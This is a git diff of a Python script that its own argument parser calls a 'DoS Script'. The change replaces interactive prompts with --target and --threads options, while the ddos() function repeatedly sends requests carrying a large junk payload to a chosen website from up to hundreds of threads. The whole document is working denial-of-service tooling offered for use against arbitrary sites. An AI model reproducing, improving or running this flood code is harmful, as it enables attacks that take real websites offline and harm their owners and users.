@@ -1,8 +1,14 @@
 from modules.color_text import *
-from modules.logo import logo
+from modules.logo import *
 from modules.excepter import return_error
 import os
 import threading
+import sys
+
+try:
+   import argparse
+except Exception as err:
+   return_error(err)
 
 try:
    import requests
@@ -14,6 +20,27 @@ b = "B" * 9900
 data = {a: b, a: b, a: b, b: a, b: a, a: b, a: b, b: a, a: b, b: a}
 
 logo()
+
+parser = argparse.ArgumentParser(description='DoS Script')
+parser.add_argument('--target', type=str, required=True, help='Target (With http/s)')
+parser.add_argument('--threads', type=int, required=True, default=999, help='Threads (default: 999)')
+
+url = parser.parse_args().target
+threads = parser.parse_args().threads
+
+print (url)
+
+if not url.__contains__("http") and not url.__contains__("https"):
+   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "URL doesnt contains http or https!")
+elif not url.__contains__("."):
+   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Invalid domain")
+elif threads == 0 or 0 >= threads:
+   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")
+else:
+   try:
+       int(threads)
+   except ValueError:
+        exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")
 
 def ddos(target, data):
     while True:
@@ -34,26 +61,10 @@ def ddos(target, data):
         except requests.exceptions.ConnectionError:
             print ("[ " + RED + '!' + NORMAL + " ] " + RED  + "Connection error!" + NORMAL)
 
-url = input("URL: ")
-
 try:
    requests.get(url)
 except Exception:
    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Cannot connect to website!" + NORMAL)
-
-try:
-    threads = int(input("Threads: "))
-except ValueError:
-    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")
-
-if threads == 0:
-    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")
-
-if not url.__contains__("http"):
-    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "URL doesnt contains http or https!")
-
-if not url.__contains__("."):
-    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Invalid domain")
 
 for i in range(threads):
     thr = threading.Thread(target=ddos, args=(url, data))
